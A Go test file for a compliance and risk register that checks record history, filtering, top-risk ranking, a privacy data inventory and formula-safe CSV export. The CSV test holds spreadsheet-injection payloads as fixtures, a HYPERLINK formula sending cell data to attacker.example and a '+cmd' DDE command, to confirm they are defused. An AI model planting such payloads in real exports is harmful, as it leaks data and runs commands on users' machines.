// SPDX-FileCopyrightText: 2026 Rashik Adhikari
// SPDX-License-Identifier: Apache-2.0

package register

import (
	"bytes"
	"encoding/csv"
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/quilzo/quilzo/internal/sheet"
)

// PLAN theme 28: a record's history is the commits that changed it, newest
// first, each with when, why, whose pseudonym and the object it was stored
// as; a commit that did not touch it is not in it.
func TestHistoryOfARecord(t *testing.T) {
	b := newBench(t)
	first := mustPut(t, b, dana, control("AC-01"))
	b.clock.forward(time.Hour)
	mustPut(t, b, dana, control("AC-02"))
	b.clock.forward(time.Hour)
	renamed := control("AC-01")
	renamed.Title = "A second factor on every account"
	second, err := b.Put(lee, "renamed after the review", renamed)
	if err != nil {
		t.Fatal(err)
	}
	id := mustID(t, renamed)
	changes, err := b.History(id, 0)
	if err != nil {
		t.Fatal(err)
	}
	if len(changes) != 2 {
		t.Fatalf("the history is %+v", changes)
	}
	now, was := changes[0], changes[1]
	if now.Commit != second.Commit || now.By != lee.Subject || now.Why != "renamed after the review" || now.New ||
		now.Object != second.Written[0].Object || now.Parent == "" {
		t.Errorf("the latest change is %+v", now)
	}
	if was.Commit != first.Commit || !was.New || was.By != dana.Subject || was.At != TimeOf(b.clock.t.Add(-2*time.Hour)) {
		t.Errorf("the first change is %+v", was)
	}
	if one, _ := b.History(id, 1); len(one) != 1 || one[0].Commit != second.Commit {
		t.Errorf("a history of one is %+v", one)
	}
	if _, err := b.History("ffffffffffffffffffffffffffffffff", 0); !errors.Is(err, ErrNotFound) {
		t.Errorf("the history of nothing was answered %v", err)
	}
}

// PLAN theme 28: a kind's records are filtered by a field's value, exactly,
// and paged as a list is; a field the kind does not have is refused rather
// than matching nothing.
func TestFindFiltersByField(t *testing.T) {
	b := newBench(t)
	for i, domain := range []Domain{"identity", "endpoints", "identity", "cloud", "identity"} {
		c := control("AC-0" + string(rune('1'+i)))
		c.Domain = domain
		mustPut(t, b, dana, c)
	}
	f, err := ParseFilter("domain=identity")
	if err != nil {
		t.Fatal(err)
	}
	all, total, err := b.Find(KindControl, []Filter{f}, 0, 0)
	if err != nil || total != 3 || len(all) != 3 {
		t.Fatalf("the identity controls are %d of %d (%v)", len(all), total, err)
	}
	page, total, err := b.Find(KindControl, []Filter{f}, 1, 1)
	if err != nil || total != 3 || len(page) != 1 || page[0].ID != all[1].ID {
		t.Fatalf("the second page of one is %+v of %d (%v)", page, total, err)
	}
	ref, _ := ParseFilter("ref=AC-04")
	if got, n, _ := b.Find(KindControl, []Filter{f, ref}, 0, 0); n != 0 || len(got) != 0 {
		t.Errorf("two filters that no record meets both of found %d", n)
	}
	if _, _, err := b.Find(KindControl, []Filter{{Field: "colour", Value: "red"}}, 0, 0); !errors.Is(err, ErrInvalid) {
		t.Errorf("a field the kind does not have was answered %v", err)
	}
	for _, bad := range []string{"", "domain", "=identity"} {
		if _, err := ParseFilter(bad); err == nil {
			t.Errorf("the filter %q was taken", bad)
		}
	}
	// No filter is a list.
	if got, n, err := b.Find(KindControl, nil, 0, 2); err != nil || n != 5 || len(got) != 2 {
		t.Errorf("an unfiltered find is %d of %d (%v)", len(got), n, err)
	}
}

// PLAN theme 28: the CSV export of a kind has a column per field of its
// schema, and no cell a spreadsheet would run: a value beginning with =, +,
// -, @, a tab or a carriage return is written after an apostrophe.
func TestCSVExportIsFormulaSafe(t *testing.T) {
	b := newBench(t)
	dangerous := control("AC-01")
	dangerous.Title = `=HYPERLINK("https://attacker.example/?"&A1,"open")`
	plus := control("AC-02")
	plus.Title = "+cmd|' /C calc'!A0"
	mustPut(t, b, dana, dangerous, plus, control("AC-03"))
	entries, _, err := b.Find(KindControl, nil, 0, 0)
	if err != nil {
		t.Fatal(err)
	}
	spec, _ := SpecOf("Control")
	var out bytes.Buffer
	if err := WriteCSV(&out, spec, entries); err != nil {
		t.Fatal(err)
	}
	written := out.String()
	rows, err := csv.NewReader(&out).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	head := rows[0]
	want := []string{"id", "created", "updated", "object"}
	for _, f := range spec.Fields {
		want = append(want, f.Name)
	}
	if strings.Join(head, ",") != strings.Join(want, ",") {
		t.Fatalf("the columns are %v; the schema's are %v", head, want)
	}
	if len(rows) != 4 {
		t.Fatalf("%d rows for three records", len(rows))
	}
	for _, row := range rows[1:] {
		for i, cell := range row {
			if sheet.IsFormula(cell) {
				t.Errorf("the %s cell %q would run as a formula", head[i], cell)
			}
		}
	}
	if !strings.Contains(written, `'=HYPERLINK`) || !strings.Contains(written, `'+cmd`) {
		t.Errorf("the formulas were not defused:\n%s", written)
	}
	// The register's export is guarded by the one rule every CSV Quilzo
	// writes is, so a negative number stays a number and the rest agree.
	for _, cell := range []string{"-3", "+4.5", "-3+cmd|' /C calc'!A0", "@SUM(A1)", "\t=1", "\r=1", "plain"} {
		if FormulaSafe(cell) != sheet.GuardCell(cell) {
			t.Errorf("the register guards %q as %q, and every other export as %q", cell, FormulaSafe(cell), sheet.GuardCell(cell))
		}
	}
}

// PLAN theme 28: the top risks for an enterprise risk register are the
// risks in order of their rating, likelihood times impact, as code works
// it out from the two typed numbers, highest first, with the rating as a
// column of its own.
func TestTopRisksCSV(t *testing.T) {
	b := newBench(t)
	for _, r := range []struct {
		ref    string
		li, im int64
	}{{"R-1", 2, 2}, {"R-2", 5, 4}, {"R-3", 3, 3}, {"R-4", 4, 5}, {"R-5", 1, 5}} {
		mustPut(t, b, dana, Risk{Ref: r.ref, Title: "Risk " + r.ref, Owner: owner, Raised: owner,
			Likelihood: r.li, Impact: r.im, Status: "open"})
	}
	entries, _, err := b.Find(KindRisk, nil, 0, 0)
	if err != nil {
		t.Fatal(err)
	}
	top, err := Top(entries, 3)
	if err != nil {
		t.Fatal(err)
	}
	spec, _ := SpecOf("Risk")
	var out bytes.Buffer
	if err := WriteCSV(&out, spec, top); err != nil {
		t.Fatal(err)
	}
	written := out.String()
	rows, _ := csv.NewReader(&out).ReadAll()
	if len(rows) != 4 {
		t.Fatalf("the top three risks are %d rows:\n%s", len(rows), written)
	}
	col := map[string]int{}
	for i, name := range rows[0] {
		col[name] = i
	}
	var got []string
	for _, row := range rows[1:] {
		got = append(got, row[col["ref"]]+"="+row[col["rating"]])
	}
	// R-2 and R-4 are both twenty, and are in the order of their
	// references; R-3 is nine.
	if strings.Join(got, " ") != "R-2=20 R-4=20 R-3=9" {
		t.Errorf("the top risks are %v", got)
	}
	controls, _, _ := b.Find(KindControl, nil, 0, 0)
	mustPut(t, b, dana, control("AC-01"))
	controls, _, _ = b.Find(KindControl, nil, 0, 0)
	if _, err := Top(controls, 3); !errors.Is(err, ErrInvalid) {
		t.Errorf("the top of a kind with no rating was answered %v", err)
	}
}

// PLAN theme 7: the data inventory is generated from the kinds' schemas,
// for a privacy officer's record of processing: for every kind, the fields
// that name a person, the free text and files kept in the side store, how
// long those are kept, and who may read the records.
func TestDataInventoryIsGeneratedFromTheSchemas(t *testing.T) {
	inv := Inventory()
	if len(inv.Kinds) != len(Kinds()) {
		t.Fatalf("the inventory has %d kinds of %d", len(inv.Kinds), len(Kinds()))
	}
	byKind := map[Kind]InventoryKind{}
	for _, k := range inv.Kinds {
		byKind[k.Kind] = k
	}
	risk := byKind[KindRisk]
	names := func(fs []InventoryField) string {
		var out []string
		for _, f := range fs {
			out = append(out, f.Field)
		}
		return strings.Join(out, " ")
	}
	if got := names(risk.People); !strings.Contains(got, "owner") || !strings.Contains(got, "raised_by") ||
		!strings.Contains(got, "approval.signers.subject") {
		t.Errorf("the risk's fields about a person are %q", got)
	}
	if got := names(risk.Text); got != "description" {
		t.Errorf("the risk's free text is %q", got)
	}
	if obs := byKind[KindObservation]; names(obs.Files) != "raw" || obs.RetainDays != 400 {
		t.Errorf("the observation's files are %q, kept %d days", names(obs.Files), obs.RetainDays)
	}
	if byKind[KindSubject].Class != ClassRestricted || len(byKind[KindSubject].People) == 0 {
		t.Errorf("the subject kind is %+v", byKind[KindSubject])
	}
	// Who may read is worked out from the policy's own roles, so it says
	// the compliance and the auditor's jobs and the site's administrator,
	// and not a reader of the site.
	readers := strings.Join(risk.Readers, "; ")
	for _, want := range []string{"compliance", "auditor", "administrator of the whole site"} {
		if !strings.Contains(readers, want) {
			t.Errorf("the risk's readers are %q, without %q", readers, want)
		}
	}
	if strings.Contains(readers, "analyst") || strings.Contains(readers, "support") {
		t.Errorf("the risk's readers are %q", readers)
	}
	if inv.SubjectMap == "" || inv.SideStore == "" {
		t.Error("the inventory does not say where the subject map and the side store are")
	}
	// The audit log names who acted by the name the access policy knows,
	// and an erasure does not reach it: the sheet says so, rather than
	// that nothing but the subject map names a person.
	if !strings.Contains(inv.AuditLog, "audit log") || !strings.Contains(inv.AuditLog, "erasure") ||
		strings.Contains(inv.SubjectMap, "Nothing else names a person") {
		t.Errorf("the inventory says of the audit log %q, and of the subject map %q", inv.AuditLog, inv.SubjectMap)
	}
	// A person-free kind lists no one.
	if len(byKind[KindRequirement].People) != 0 {
		t.Errorf("a requirement names people: %+v", byKind[KindRequirement].People)
	}
}
